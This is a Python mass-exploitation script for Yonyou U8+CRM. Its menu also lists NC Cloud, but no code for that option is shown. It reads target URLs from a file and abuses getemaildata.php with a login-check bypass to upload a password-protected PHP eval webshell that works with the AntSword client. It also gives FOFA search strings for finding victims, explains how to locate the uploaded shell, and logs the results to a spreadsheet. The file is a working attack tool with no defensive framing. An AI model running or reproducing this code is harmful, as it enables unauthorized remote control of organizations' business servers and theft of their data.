
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork

def help():
    print('''
    fofa: body="用友U8CRM"
        1. 用友U8+CRM getemaildata.php利用, 批量上传webshell, 密码p@assW0rd, 支持蚁剑
    fofa: app="用友-NC-Cloud"
        2. 用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞, 批量上传webshell, 密码p@assW0rd, 支持蚁剑
    x. 退出
    ''')


def vul_getemaildata(url):
    webshell = "moon.php "
    aS = '<?php @eval($_POST["p@assW0rd"]);?>'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Content-Type': 'multipart/form-data; boundary=WebKitFormBoundarykS5RKgl8t3nwInMQ'
    }
    payload = (
        "--WebKitFormBoundarykS5RKgl8t3nwInMQ\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{webshell}"\r\n'
        "Content-Type: text/plain\r\n"
        "\r\n"
        f"{aS}\r\n"
        "--WebKitFormBoundarykS5RKgl8t3nwInMQ"
    )
    method = "POST"
    path = "/ajax/getemaildata.php?DontCheckLogin=1"
    notes = f"访问的解析文件格式为upd***.tmp.php，星号部分为返回的文件名的十六进制减去一, {url}/tmpfile/upd***.tmp.php"
    return (url, method, headers, payload, path, notes)


def run():
    OUTDIR = "result/用友U8+CRM"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))
    if num == 1:
        data = []
        for url in li:
            item = vul_getemaildata(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}用友U8+CRM 文件上传.xlsx")

    else:
        print('bye...')
